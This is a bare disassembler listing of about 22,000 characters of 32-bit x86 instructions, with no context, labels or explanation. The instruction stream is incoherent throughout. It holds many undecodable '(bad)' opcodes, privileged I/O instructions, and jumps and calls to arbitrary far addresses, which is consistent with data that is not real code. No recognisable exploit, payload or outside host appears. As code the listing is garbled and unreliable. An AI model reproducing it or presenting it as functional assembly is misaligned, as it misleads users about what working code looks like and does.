  41aaea:	or     DWORD PTR [eax-0x38d78d28],ecx
  41aaf0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41aaf2:	xchg   ebx,eax
  41aaf3:	or     DWORD PTR [ebp-0x1e],edi
  41aaf6:	and    edi,DWORD PTR [edx]
  41aaf8:	(bad)  
  41aaf9:	sbb    al,0xea
  41aafb:	push   ss
  41aafc:	mov    ebp,0xb1fd8f40
  41ab01:	fidivr WORD PTR [eax-0x40df1050]
  41ab07:	inc    ebx
  41ab08:	sbb    DWORD PTR [ebp+0x5294d71b],ecx
  41ab0e:	push   esp
  41ab0f:	outs   dx,DWORD PTR ds:[esi]
  41ab10:	arpl   WORD PTR [ebx+0x6641ad2e],cx
  41ab16:	mov    ds:0x44c2229d,eax
  41ab1b:	cmp    eax,0xe6d65231
  41ab20:	push   cs
  41ab21:	push   ds
  41ab22:	push   ebx
  41ab23:	lock cdq 
  41ab25:	cmp    cl,BYTE PTR [ebp+0x11f9263b]
  41ab2b:	adc    DWORD PTR [ebp-0xb],edi
  41ab2e:	mov    ecx,0xc7287207
  41ab33:	out    0x92,eax
  41ab35:	sub    bl,BYTE PTR [edx]
  41ab37:	(bad)  
  41ab39:	sbb    ebx,ecx
  41ab3b:	sub    al,al
  41ab3d:	dec    edx
  41ab3e:	jns    0x41aad4
  41ab40:	aam    0xa5
  41ab42:	ins    DWORD PTR es:[edi],dx
  41ab43:	inc    edx
  41ab44:	jecxz  0x41aaec
  41ab46:	xor    dl,dh
  41ab48:	mov    ah,0x51
  41ab4a:	sar    DWORD PTR [ebp-0xf],1
  41ab4d:	iret   
  41ab4e:	mov    DWORD PTR ds:0xe0c8,eax
  41ab53:	repnz test dl,bl
  41ab56:	pop    edx
  41ab57:	jecxz  0x41aba5
  41ab59:	(bad)  
  41ab5a:	repz xor BYTE PTR [ebp-0xf2d57d3],dh
  41ab61:	push   0x6f
  41ab63:	jg     0x41ab79
  41ab65:	(bad)  
  41ab66:	pop    ebx
  41ab67:	ds js  0x41ab50
  41ab6a:	or     eax,0x3e7cbc85
  41ab6f:	ja     0x41abae
  41ab71:	lock mov esp,0x28404f69
  41ab77:	push   cs
  41ab78:	or     al,0x26
  41ab7a:	mov    dl,0x79
  41ab7c:	jo     0x41ab9a
  41ab7e:	fidiv  DWORD PTR [ebx+0x69]
  41ab81:	ins    DWORD PTR es:[edi],dx
  41ab82:	enter  0x45f,0x88
  41ab86:	dec    ah
  41ab88:	xchg   esi,eax
  41ab89:	jmp    0x48e4c57a
  41ab8e:	pusha  
  41ab8f:	push   edi
  41ab90:	fnstcw WORD PTR [esi+0x62f8dcb2]
  41ab96:	and    bl,ch
  41ab98:	ret    0x80a0
  41ab9b:	push   esi
  41ab9c:	cmp    al,0xcf
  41ab9e:	aas    
  41ab9f:	inc    esp
  41aba0:	es arpl si,sp
  41aba3:	add    eax,DWORD PTR [ebx]
  41aba5:	jp     0x41abce
  41aba7:	test   DWORD PTR [ebx],ecx
  41aba9:	scas   al,BYTE PTR es:[edi]
  41abaa:	jbe    0x41ab4c
  41abac:	or     eax,0xc1f38773
  41abb1:	mov    al,0x1c
  41abb3:	mov    al,0xe6
  41abb5:	(bad)  
  41abb7:	lahf   
  41abb8:	ds sbb ah,al
  41abbb:	out    dx,al
  41abbc:	invd   
  41abbe:	pop    esi
  41abbf:	inc    ebx
  41abc0:	jge    0x41ab6f
  41abc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc3:	pop    ecx
  41abc4:	aam    0x69
  41abc6:	xchg   DWORD PTR [edi+0x2a9cb87d],edi
  41abcc:	aad    0xc1
  41abce:	cmp    edx,ebx
  41abd0:	pop    edi
  41abd1:	dec    edi
  41abd2:	ss cs mov bl,0x52
  41abd6:	push   ebp
  41abd7:	push   es
  41abd8:	mov    dh,0xff
  41abda:	mov    al,0x9c
  41abdc:	iret   
  41abdd:	int3   
  41abde:	lea    esp,[eax]
  41abe0:	and    eax,0x7b718abb
  41abe5:	jecxz  0x41ac23
  41abe7:	push   cs
  41abe8:	push   edi
  41abe9:	arpl   WORD PTR [ebx+eax*2+0x5b],di
  41abed:	in     eax,dx
  41abee:	pop    esp
  41abef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf0:	jno    0x41ac34
  41abf2:	jge    0x41ab8e
  41abf4:	cs jbe 0x41ab8c
  41abf7:	test   al,0xdc
  41abf9:	or     al,0x63
  41abfb:	sbb    dh,BYTE PTR [eax-0x2cd1b457]
  41ac01:	xchg   ebx,eax
  41ac02:	xor    eax,0xe144ae67
  41ac07:	jmp    0x41ac1a
  41ac09:	fimul  DWORD PTR [eax]
  41ac0b:	out    dx,al
  41ac0c:	mov    ah,0x17
  41ac0e:	push   esi
  41ac0f:	fcom   QWORD PTR [edi-0x5a]
  41ac12:	add    dl,ch
  41ac14:	in     eax,dx
  41ac15:	stos   BYTE PTR es:[edi],al
  41ac16:	dec    esi
  41ac17:	in     eax,dx
  41ac18:	push   0xfffffff9
  41ac1a:	push   ecx
  41ac1b:	or     dh,BYTE PTR [edi]
  41ac1d:	idiv   ah
  41ac1f:	cmp    eax,0x520ab333
  41ac24:	cdq    
  41ac25:	ror    BYTE PTR [esi+0x45],cl
  41ac28:	(bad)  
  41ac29:	call   0x5b448402
  41ac2e:	bound  ecx,QWORD PTR [eax-0x144aff7c]
  41ac34:	sti    
  41ac35:	shr    esp,cl
  41ac37:	xor    BYTE PTR [esi+eiz*4-0x1041acb6],bl
  41ac3e:	mov    eax,?
  41ac40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac42:	sub    eax,0xa583d438
  41ac47:	ds mov ebp,0x8182e7e4
  41ac4d:	loop   0x41ac4a
  41ac4f:	cmc    
  41ac50:	je     0x41ac20
  41ac52:	push   esp
  41ac53:	push   ebx
  41ac54:	or     eax,0xea6e9b6e
  41ac59:	shr    cl,1
  41ac5b:	xor    BYTE PTR [edi+0x4f],0x8
  41ac5f:	rcr    DWORD PTR [edi-0x5a5a6346],1
  41ac65:	push   cs
  41ac66:	push   0x64373b53
  41ac6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac6c:	test   eax,0xa423b2c2
  41ac71:	pop    esi
  41ac72:	xor    ebx,ecx
  41ac74:	pop    ecx
  41ac75:	jp     0x41ac40
  41ac77:	or     ah,BYTE PTR [esp+eax*1+0x6a]
  41ac7b:	loope  0x41ac6b
  41ac7d:	dec    eax
  41ac7e:	jl     0x41ac66
  41ac80:	test   DWORD PTR [ebx-0x2f],esp
  41ac83:	out    dx,eax
  41ac84:	aaa    
  41ac85:	adc    ah,cl
  41ac87:	imul   ebx,DWORD PTR [ecx],0xf0d3e420
  41ac8d:	iret   
  41ac8e:	outs   dx,DWORD PTR ds:[esi]
  41ac8f:	(bad)  
  41ac90:	sbb    ebx,DWORD PTR [esi]
  41ac92:	ret    0xea9c
  41ac95:	mov    DWORD PTR [edx],esp
  41ac97:	nop
  41ac98:	shr    DWORD PTR [ecx],1
  41ac9a:	enter  0xb124,0xd8
  41ac9e:	sbb    eax,DWORD PTR [ebx]
  41aca0:	push   edx
  41aca1:	adc    al,0xe3
  41aca3:	adc    eax,0x217e94f8
  41aca8:	ffreep st(1)
  41acaa:	cdq    
  41acab:	mov    al,ds:0x8bc8af07
  41acb0:	inc    ecx
  41acb1:	xchg   ecx,eax
  41acb2:	or     al,BYTE PTR [esi+0x1c]
  41acb5:	fwait
  41acb6:	aaa    
  41acb7:	repnz arpl WORD PTR [edx+0x5aca7221],bp
  41acbe:	add    DWORD PTR ds:0xe6602363,0xffffffa6
  41acc5:	sub    eax,DWORD PTR [edi-0xc5b046c]
  41accb:	shl    DWORD PTR [esi+0x3f],0xa7
  41accf:	jns    0x41acc0
  41acd1:	retf   
  41acd2:	out    dx,eax
  41acd3:	test   DWORD PTR [esi-0x29],esi
  41acd6:	push   es
  41acd7:	scas   al,BYTE PTR es:[edi]
  41acd8:	sbb    eax,0x79e32a28
  41acdd:	dec    edx
  41acde:	jo     0x41ad05
  41ace0:	and    al,BYTE PTR [ebx+0x6b16f6d4]
  41ace6:	ror    DWORD PTR [ecx+0x2ebb5549],cl
  41acec:	pop    ss
  41aced:	scas   eax,DWORD PTR es:[edi]
  41acee:	adc    DWORD PTR [ebx+0x76],ebx
  41acf1:	xlat   BYTE PTR ds:[ebx]
  41acf2:	stos   BYTE PTR es:[edi],al
  41acf3:	pop    ebp
  41acf4:	shl    DWORD PTR [ecx+0x211fa861],1
  41acfa:	dec    edi
  41acfb:	out    0x99,eax
  41acfd:	retf   0x1eca
  41ad00:	out    dx,al
  41ad01:	mov    edi,0x635e1b69
  41ad06:	fild   QWORD PTR [edx+0x19]
  41ad09:	inc    edx
  41ad0a:	clc    
  41ad0b:	shl    BYTE PTR [esp+ebp*4-0xab5fed],cl
  41ad12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad13:	test   al,0xee
  41ad15:	push   ds
  41ad16:	add    BYTE PTR [ebx],bl
  41ad18:	test   BYTE PTR [ecx+0x28],ch
  41ad1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad1c:	test   eax,0x34321aae
  41ad21:	in     al,0x97
  41ad23:	(bad)  [eax+0x1b81d589]
  41ad29:	jns    0x41ad94
  41ad2b:	push   edi
  41ad2c:	or     ah,dh
  41ad2e:	lods   eax,DWORD PTR ds:[esi]
  41ad2f:	rcl    DWORD PTR [ecx+ebx*8+0x264b364e],cl
  41ad36:	das    
  41ad37:	jae    0x41ad38
  41ad39:	pop    eax
  41ad3a:	dec    ebp
  41ad3b:	lods   al,BYTE PTR ds:[esi]
  41ad3c:	int    0xbe
  41ad3e:	retf   
  41ad3f:	push   eax
  41ad40:	mov    WORD PTR [esi-0x6f],es
  41ad43:	call   FWORD PTR [ebp+0x69503514]
  41ad49:	(bad)  
  41ad4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad4c:	mov    ebx,0x78980595
  41ad51:	sbb    ch,BYTE PTR [edi]
  41ad53:	ds jno 0x41acfb
  41ad56:	mov    al,ds:0x24d4d4e6
  41ad5b:	mov    ebp,0xd4d1819f
  41ad60:	xchg   edx,eax
  41ad61:	xchg   edi,eax
  41ad63:	xchg   edi,eax
  41ad64:	icebp  
  41ad65:	(bad)  
  41ad67:	xor    BYTE PTR [edi+0x658b4e3],ch
  41ad6d:	icebp  
  41ad6e:	shl    DWORD PTR [edi+0x23],1
  41ad71:	(bad)  
  41ad73:	inc    ecx
  41ad74:	xchg   ebx,eax
  41ad75:	in     al,0xad
  41ad77:	out    0xe,al
  41ad79:	or     ch,bh
  41ad7b:	scas   al,BYTE PTR es:[edi]
  41ad7c:	mov    al,0xd4
  41ad7e:	sahf   
  41ad7f:	out    dx,eax
  41ad80:	(bad)  ds:0x3d1726c
  41ad86:	lods   eax,DWORD PTR ds:[esi]
  41ad87:	jno    0x41ad74
  41ad89:	(bad)
  41ad8c:	mov    cl,0x5c
  41ad8e:	outs   dx,DWORD PTR ds:[esi]
  41ad8f:	std    
  41ad90:	retf   
  41ad91:	jb     0x41ad22
  41ad93:	loop   0x41ae01
  41ad95:	jmp    0x92ad9130
  41ad9a:	scas   eax,DWORD PTR es:[edi]
  41ad9b:	add    esi,DWORD PTR [ecx+edx*8]
  41ad9e:	repnz std 
  41ada0:	(bad)  
  41ada1:	push   ds
  41ada2:	mov    ch,0x5f
  41ada4:	pop    ebx
  41ada5:	push   cs
  41ada6:	xchg   esp,eax
  41ada7:	sbb    dl,dh
  41ada9:	ret    
  41adaa:	fstp   TBYTE PTR [ecx-0x2e30b0de]
  41adb0:	fdivr  QWORD PTR [edx]
  41adb2:	mov    ds:0x3b5d56c1,al
  41adb7:	jnp    0x41ad6f
  41adb9:	in     al,0xf8
  41adbb:	pop    edi
  41adbc:	nop
  41adbd:	ret    0x2eb5
  41adc0:	mov    esp,0x3f27ca1c
  41adc5:	loop   0x41ad61
  41adc7:	push   ds
  41adc8:	mov    edx,0xdde272bd
  41adcd:	or     ah,BYTE PTR [edx]
  41adcf:	jecxz  0x41ae1a
  41add1:	jp     0x41ae19
  41add3:	dec    eax
  41add4:	(bad)  
  41add5:	cmp    edx,ebp
  41add7:	dec    edx
  41add8:	rol    BYTE PTR ds:0x63016ddd,cl
  41adde:	fldcw  WORD PTR ds:0xdf5c3434
  41ade4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ade5:	dec    edx
  41ade6:	test   al,0x3c
  41ade8:	test   BYTE PTR [eax],dh
  41adea:	rol    bl,1
  41adec:	ror    BYTE PTR [edx+0x73],1
  41adef:	vmread DWORD PTR [edi-0x7351d450],ebx
  41adf6:	inc    eax
  41adf7:	lds    ebp,FWORD PTR [eax]
  41adf9:	test   al,0xdb
  41adfb:	loope  0x41ae3d
  41adfd:	hlt    
  41adfe:	inc    eax
  41adff:	jmp    0xb670bac3
  41ae04:	repz neg esp
  41ae07:	mov    eax,ds:0x34104945
  41ae0c:	mov    al,0xaf
  41ae0e:	inc    ebx
  41ae0f:	cli    
  41ae10:	mov    dl,0x8e
  41ae12:	cmp    ah,ch
  41ae14:	pop    ebx
  41ae15:	push   eax
  41ae16:	enter  0xc457,0xdd
  41ae1a:	jmp    0x41ae6e
  41ae1c:	(bad)  
  41ae1d:	xor    al,0xfd
  41ae1f:	stc    
  41ae20:	dec    ecx
  41ae21:	fwait
  41ae22:	add    DWORD PTR [ebx-0x4cb32f54],edi
  41ae28:	out    0xf5,al
  41ae2a:	push   esp
  41ae2b:	inc    ecx
  41ae2c:	call   0xdfde:0x6d36d904
  41ae33:	out    0x61,eax
  41ae35:	mov    al,ds:0xfddd1308
  41ae3b:	imul   ebx,DWORD PTR [ecx*1+0x17d291a7],0x16
  41ae43:	ins    BYTE PTR es:[edi],dx
  41ae44:	je     0x41add9
  41ae46:	cs xchg ecx,eax
  41ae48:	in     al,0x2d
  41ae4a:	dec    esp
  41ae4b:	or     eax,0xea12b319
  41ae50:	mov    bl,0xb8
  41ae52:	(bad)  
  41ae53:	jp     0x41ae22
  41ae55:	in     eax,0xdb
  41ae57:	cmp    DWORD PTR [esp-0x3c8a0bb5],esp
  41ae5e:	push   ecx
  41ae5f:	or     bh,al
  41ae61:	test   al,0x40
  41ae63:	arpl   WORD PTR [ebx+0x1d],dx
  41ae66:	or     ah,BYTE PTR [edx-0x16302391]
  41ae6c:	sub    DWORD PTR es:[ebp-0x22fb1366],ebx
  41ae73:	leave  
  41ae74:	lods   eax,DWORD PTR ds:[esi]
  41ae75:	in     eax,dx
  41ae76:	and    eax,DWORD PTR [eax]
  41ae78:	mov    edx,0x354fa09d
  41ae7d:	xchg   cl,cl
  41ae7f:	or     BYTE PTR [edi],cl
  41ae81:	repz ds ret 
  41ae84:	mov    esi,0x21328b4a
  41ae89:	dec    ebx
  41ae8a:	(bad)  
  41ae8b:	jne    0x41ae52
  41ae8d:	push   ss
  41ae8e:	mov    ch,0x67
  41ae90:	test   DWORD PTR [edi+0x4b48feab],0xc10fe506
  41ae9a:	pop    ecx
  41ae9b:	lods   al,BYTE PTR fs:[esi]
  41ae9d:	test   eax,0x421a4834
  41aea2:	sub    eax,esp
  41aea4:	or     ax,0x8136
  41aea8:	iret   
  41aea9:	shl    DWORD PTR [edi+0xc1bcec5],cl
  41aeaf:	sbb    ebp,DWORD PTR [ecx+0x73]
  41aeb2:	fs xor al,0x83
  41aeb5:	mov    dl,0x6b
  41aeb7:	nop
  41aeb8:	jmp    0x32181939
  41aebd:	jge    0x41af12
  41aebf:	xchg   ebp,eax
  41aec0:	cmp    eax,0xbd141939
  41aec5:	add    DWORD PTR [eax-0x5fe8b819],ebx
  41aecb:	(bad)  
  41aecd:	lds    ecx,FWORD PTR ds:0xee7e091f
  41aed3:	fldenv fs:[ebp+0x4cf49fe4]
  41aeda:	lods   eax,DWORD PTR ds:[esi]
  41aedb:	and    eax,0x414a0713
  41aee0:	push   cs
  41aee1:	cdq    
  41aee2:	mov    eax,ds:0x35ce72e2
  41aee7:	adc    BYTE PTR [ebx+0x6ec7dc45],cl
  41aeed:	sar    BYTE PTR [ecx+eax*2+0x5a],1
  41aef1:	enter  0xea65,0x32
  41aef5:	adc    eax,0xa257977e
  41aefa:	cmc    
  41aefb:	or     eax,DWORD PTR [eax-0x25]
  41aefe:	icebp  
  41aeff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af00:	jnp    0x41af6c
  41af02:	popa   
  41af03:	or     al,0x10
  41af05:	adc    al,0xf9
  41af07:	and    DWORD PTR [esi],0xc612ee6e
  41af0d:	mov    ecx,0xf959aec2
  41af12:	fidivr DWORD PTR [ecx-0x38]
  41af15:	stos   BYTE PTR es:[edi],al
  41af16:	dec    eax
  41af17:	stos   BYTE PTR es:[edi],al
  41af18:	mov    bh,0xf9
  41af1a:	popa   
  41af1b:	iret   
  41af1c:	cdq    
  41af1d:	mov    dh,0xf0
  41af1f:	icebp  
  41af20:	ins    BYTE PTR es:[edi],dx
  41af21:	popf   
  41af22:	sbb    al,0x2a
  41af24:	(bad)  
  41af25:	and    eax,0x1c00cebb
  41af2a:	lea    eax,[ebx]
  41af2c:	mov    al,0x2f
  41af2e:	xor    DWORD PTR [ecx+0x45],edi
  41af31:	mov    esp,0xeb1a991a
  41af36:	mov    al,0x5c
  41af38:	test   al,0xec
  41af3a:	add    BYTE PTR [eax+0x57a5ee41],bl
  41af40:	lock fiadd DWORD PTR [eax]
  41af43:	into   
  41af44:	scas   eax,DWORD PTR es:[edi]
  41af45:	cmp    esp,ecx
  41af47:	fwait
  41af48:	push   0x5d9685be
  41af4d:	add    eax,esp
  41af4f:	push   cs
  41af50:	and    esi,DWORD PTR [ecx+0x52c8acd]
  41af56:	jno    0x41af39
  41af58:	fidiv  WORD PTR [esi+ebp*4+0x27]
  41af5c:	fwait
  41af5d:	dec    esp
  41af5e:	add    DWORD PTR [edx],esp
  41af60:	cwde   
  41af61:	pop    ss
  41af62:	pop    edx
  41af63:	xchg   edx,eax
  41af64:	add    eax,0x996200e2
  41af69:	out    0x54,al
  41af6b:	in     al,dx
  41af6c:	daa    
  41af6d:	call   0x70e49a33
  41af72:	mov    dl,0x4c
  41af74:	xchg   ebp,eax
  41af75:	fisub  DWORD PTR [eax-0xb3f868]
  41af7b:	dec    ebp
  41af7c:	ret    
  41af7d:	mov    esp,0x2ca64832
  41af82:	(bad)  
  41af84:	(bad)  
  41af85:	xlat   BYTE PTR ds:[ebx]
  41af86:	or     BYTE PTR [ebx-0x3688f1d7],bl
  41af8c:	jo     0x41afd5
  41af8e:	imul   esp,edx,0xffffff8f
  41af91:	xor    edi,eax
  41af93:	xchg   esi,eax
  41af94:	jno    0x41af64
  41af96:	or     edx,DWORD PTR [ebp+ecx*1+0x5926c8ca]
  41af9d:	aam    0x3a
  41af9f:	out    dx,al
  41afa0:	or     eax,ebp
  41afa2:	xchg   ecx,eax
  41afa3:	aam    0xfb
  41afa5:	push   edi
  41afa6:	or     DWORD PTR [edi],ebx
  41afa8:	test   cl,ah
  41afaa:	rol    DWORD PTR [edx+0x416e558b],0xd
  41afb1:	jmp    0x62fca6a8
  41afb6:	fsubp  st(3),st
  41afb8:	scas   al,BYTE PTR es:[edi]
  41afb9:	jb     0x41af6d
  41afbb:	add    ch,BYTE PTR [edx]
  41afbd:	popf   
  41afbe:	xchg   ecx,eax
  41afbf:	les    esp,FWORD PTR [ecx]
  41afc1:	(bad)  
  41afc2:	das    
  41afc3:	ins    DWORD PTR es:[edi],dx
  41afc4:	jmp    FWORD PTR [esi+0x5c7cb89b]
  41afca:	push   ss
  41afcb:	push   edx
  41afcc:	rcl    BYTE PTR [eax],0x8f
  41afcf:	arpl   WORD PTR [esi+0x6f],bx
  41afd2:	fwait
  41afd3:	add    BYTE PTR [ebx],0xfc
  41afd6:	mov    ch,0xa7
  41afd8:	sbb    BYTE PTR [ebp-0xbfdb047],ch
  41afde:	imul   edi,esp,0x47398299
  41afe4:	pop    ss
  41afe5:	fcom   QWORD PTR [ecx-0x9]
  41afe8:	test   ah,0xe9
  41afeb:	enter  0x7168,0xed
  41afef:	xor    BYTE PTR [eax+0x3],cl
  41aff2:	add    ah,ah
  41aff4:	fwait
  41aff5:	mov    ebx,0xa4acb9cc
  41affa:	test   BYTE PTR [eax+edi*1+0x18],ah
  41affe:	inc    esi
  41afff:	daa    
  41b000:	add    dl,bl
  41b002:	retf   
  41b003:	lods   eax,DWORD PTR ds:[esi]
  41b004:	fcmovu st,st(0)
  41b006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b007:	inc    esp
  41b008:	or     DWORD PTR [eax*4+0x125ad45d],ebx
  41b00f:	push   ss
  41b010:	not    BYTE PTR [ebx+0x18]
  41b013:	xchg   BYTE PTR [edx+0x47],cl
  41b016:	lock push edi
  41b018:	inc    edi
  41b019:	out    dx,al
  41b01a:	cmp    DWORD PTR [ebp-0x22238995],esi
  41b020:	sbb    edi,eax
  41b022:	aam    0xbb
  41b024:	retf   
  41b025:	jnp    0x41b01a
  41b027:	cdq    
  41b028:	mov    ah,0x18
  41b02a:	dec    ecx
  41b02b:	aad    0x6c
  41b02d:	push   ebx
  41b02e:	push   cs
  41b02f:	cmp    eax,DWORD PTR [ebp-0x7]
  41b032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b033:	inc    esi
  41b034:	push   esp
  41b035:	mov    cl,0x42
  41b037:	cmp    ebp,DWORD PTR [ecx]
  41b039:	pop    ss
  41b03a:	(bad)
  41b03d:	xor    BYTE PTR [edi+0x314a0f2e],cl
  41b043:	and    DWORD PTR [ebx],esi
  41b045:	cdq    
  41b046:	xchg   ebp,edi
  41b048:	cmp    eax,0x1aa0f42e
  41b04d:	cwde   
  41b04e:	mov    edi,0xe2b3bf19
  41b053:	and    bh,dl
  41b055:	into   
  41b056:	pusha  
  41b057:	sbb    DWORD PTR [ecx+0x3f],edx
  41b05a:	call   0xa01a988f
  41b05f:	push   eax
  41b060:	fdivrp st(3),st
  41b062:	add    esi,DWORD PTR [edi+0x24]
  41b065:	add    ch,cl
  41b067:	mov    edx,0x52f510d1
  41b06c:	lods   al,BYTE PTR ds:[esi]
  41b06d:	lods   al,BYTE PTR ds:[esi]
  41b06e:	inc    edi
  41b06f:	leave  
  41b070:	sti    
  41b071:	aam    0x25
  41b073:	or     DWORD PTR [esi-0x36305e57],edi
  41b079:	sbb    bh,BYTE PTR [edi+0x4f0c723d]
  41b07f:	rol    BYTE PTR [ebx-0x7f],cl
  41b082:	ins    BYTE PTR es:[edi],dx
  41b083:	lds    edi,FWORD PTR [edx-0x61a7d102]
  41b089:	cmp    DWORD PTR [esi-0x595cd67e],0x2e7e6002
  41b093:	jne    0x41b087
  41b095:	std    
  41b096:	cdq    
  41b097:	pop    esi
  41b098:	shr    BYTE PTR [edi+0x1d334434],1
  41b09e:	lock dec ecx
  41b0a0:	std    
  41b0a1:	push   ebx
  41b0a2:	dec    ebp
  41b0a3:	mov    edi,0x5c517b7e
  41b0a8:	mov    BYTE PTR [edi-0x43],cl
  41b0ab:	fstp   TBYTE PTR [ebp+0x24826f28]
  41b0b1:	or     ecx,ecx
  41b0b3:	add    ebx,esp
  41b0b5:	mov    esi,0x5c9f1948
  41b0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0bb:	push   edi
  41b0bc:	jo     0x41b083
  41b0be:	les    ecx,FWORD PTR [esi+0x3ab3c939]
  41b0c4:	xchg   esi,eax
  41b0c5:	mov    eax,0xc13908f4
  41b0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0cb:	dec    esi
  41b0cc:	aas    
  41b0cd:	inc    ecx
  41b0ce:	inc    ebp
  41b0cf:	inc    ebx
  41b0d0:	or     BYTE PTR [edx-0x6cdd51c4],ch
  41b0d6:	lods   al,BYTE PTR ds:[esi]
  41b0d7:	adc    ch,al
  41b0d9:	push   ebp
  41b0da:	push   eax
  41b0db:	sti    
  41b0dc:	aam    0x7b
  41b0de:	push   edx
  41b0df:	int    0xe0
  41b0e1:	cmp    DWORD PTR [edi+0x9f71a6e],edi
  41b0e7:	fsubr  st(4),st
  41b0e9:	stos   DWORD PTR es:[edi],eax
  41b0ea:	pusha  
  41b0eb:	loopne 0x41b0da
  41b0ed:	adc    ebx,DWORD PTR [edi+0x532e7ae3]
  41b0f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0f4:	and    ebp,ecx
  41b0f6:	mov    cl,dh
  41b0f8:	mov    bl,0xa4
  41b0fa:	popw   ds
  41b0fc:	xor    BYTE PTR [edx],bh
  41b0fe:	mov    bl,0xba
  41b100:	add    DWORD PTR [esi+0x10],ebp
  41b103:	push   ss
  41b104:	outs   dx,DWORD PTR ds:[esi]
  41b105:	push   0x46c93b13
  41b10a:	add    cl,0xa7
  41b10d:	or     BYTE PTR [ebx-0x4d],bh
  41b110:	popa   
  41b111:	adc    DWORD PTR [ebp+0x3216c33a],edi
  41b117:	mov    dh,0x19
  41b119:	out    dx,al
  41b11a:	loopne 0x41b159
  41b11c:	pusha  
  41b11d:	cmp    eax,0xd58fd98b
  41b122:	mov    gs,ecx
  41b124:	mov    eax,ds:0xf9f51a22
  41b129:	cli    
  41b12a:	out    0xbb,al
  41b12c:	jb     0x41b0d6
  41b12e:	jae    0x41b137
  41b130:	cmp    eax,0x4be11c89
  41b135:	mov    eax,ds:0xb5b3a268
  41b13a:	imul   esp,DWORD PTR [esi],0x1f
  41b13d:	fisttp WORD PTR [edx]
  41b13f:	mov    bh,0xb3
  41b141:	js     0x41b1aa
  41b143:	sbb    eax,0x2e357994
  41b148:	retf   0x95a1
  41b14b:	inc    ebp
  41b14c:	push   ss
  41b14d:	xchg   edi,eax
  41b14e:	(bad)  
  41b150:	mov    DWORD PTR [ebx+0x16a49224],esp
  41b156:	loope  0x41b0fb
  41b158:	xchg   ebp,eax
  41b159:	fisttp QWORD PTR [edi]
  41b15b:	cli    
  41b15c:	aaa    
  41b15d:	or     ah,dh
  41b15f:	jno    0x41b169
  41b161:	dec    ebp
  41b162:	ret    
  41b163:	pop    esi
  41b164:	mov    DWORD PTR [esi],edx
  41b166:	ds stos DWORD PTR es:[edi],eax
  41b168:	imul   ebx,DWORD PTR [esi+0x1ca560ef],0x7e
  41b16f:	lods   al,BYTE PTR ds:[esi]
  41b170:	not    BYTE PTR ss:[bp+di+0x5b29]
  41b176:	rcl    BYTE PTR [eax+edi*4+0x6d],cl
  41b17a:	dec    edx
  41b17b:	push   0x4d144b30
  41b180:	iret   
  41b181:	sub    ebx,esi
  41b183:	inc    ecx
  41b184:	sbb    bh,bh
  41b186:	and    eax,0xb619c0c5
  41b18b:	ins    DWORD PTR es:[edi],dx
  41b18c:	jmp    0x7518:0xfee8e756
  41b193:	add    ecx,DWORD PTR [edx-0x75b708af]
  41b199:	out    dx,eax
  41b19a:	push   0xffffffa1
  41b19c:	ret    0x74c3
  41b19f:	nop
  41b1a0:	xchg   ebx,eax
  41b1a1:	lds    esp,FWORD PTR [ebx+0x29]
  41b1a4:	xchg   ebp,eax
  41b1a5:	jecxz  0x41b1ca
  41b1a7:	dec    eax
  41b1a8:	sbb    DWORD PTR [edi-0x72],0x1ef19559
  41b1af:	int3   
  41b1b0:	cmp    eax,0xb37c4611
  41b1b5:	adc    DWORD PTR [ebx+0xa269607],ecx
  41b1bb:	std    
  41b1bc:	popf   
  41b1bd:	inc    eax
  41b1be:	dec    ebx
  41b1bf:	aam    0xa8
  41b1c1:	in     eax,dx
  41b1c2:	test   al,0x16
  41b1c4:	and    edx,ecx
  41b1c6:	mov    BYTE PTR [eax+0x1ce22e07],dl
  41b1cc:	shl    DWORD PTR [edx],cl
  41b1ce:	sbb    BYTE PTR [edx+0x72],al
  41b1d1:	pop    edi
  41b1d2:	adc    eax,0x15b14fe
  41b1d7:	jae    0x41b24d
  41b1d9:	(bad)  
  41b1da:	shr    BYTE PTR [edi],1
  41b1dc:	pop    ebx
  41b1dd:	or     al,0x89
  41b1df:	or     al,0x9
  41b1e1:	add    eax,0xefac371f
  41b1e6:	mov    al,BYTE PTR ds:0x8b2f7b92
  41b1ec:	fwait
  41b1ed:	fwait
  41b1ee:	dec    ebx
  41b1ef:	or     ebx,DWORD PTR [ebx+0x27]
  41b1f2:	out    0xfc,al
  41b1f4:	shl    BYTE PTR [esi],1
  41b1f6:	xchg   esp,eax
  41b1f7:	mov    eax,0xbb9fc28a
  41b1fc:	dec    esi
  41b1fd:	int3   
  41b1fe:	sub    bh,BYTE PTR [esi]
  41b200:	push   edi
  41b201:	jne    0x41b1ca
  41b203:	(bad)  
  41b204:	lds    ebp,FWORD PTR [ebp+0x223f3737]
  41b20a:	frndint 
  41b20c:	cmp    al,0xf5
  41b20e:	dec    edi
  41b20f:	add    eax,esp
  41b211:	sub    ah,ah
  41b213:	jne    0x41b27e
  41b215:	push   0x42192e46
  41b21a:	ret    
  41b21b:	adc    BYTE PTR [ecx-0x6b5db96f],bh
  41b221:	test   al,0xff
  41b223:	sub    eax,DWORD PTR [eax-0x3f0fecf9]
  41b229:	cs (bad) 
  41b22b:	std    
  41b22c:	test   al,0xb
  41b22e:	adc    esp,DWORD PTR [edi+0xc7f5733]
  41b234:	fnstenv [ebx]
  41b236:	cmp    BYTE PTR [esi+0x15],0x62
  41b23a:	and    DWORD PTR [bp+si],edx
  41b23d:	xor    ebp,esp
  41b23f:	cld    
  41b240:	sahf   
  41b241:	push   es
  41b242:	sbb    BYTE PTR [edx-0x2d],al
  41b245:	push   edi
  41b246:	push   ebx
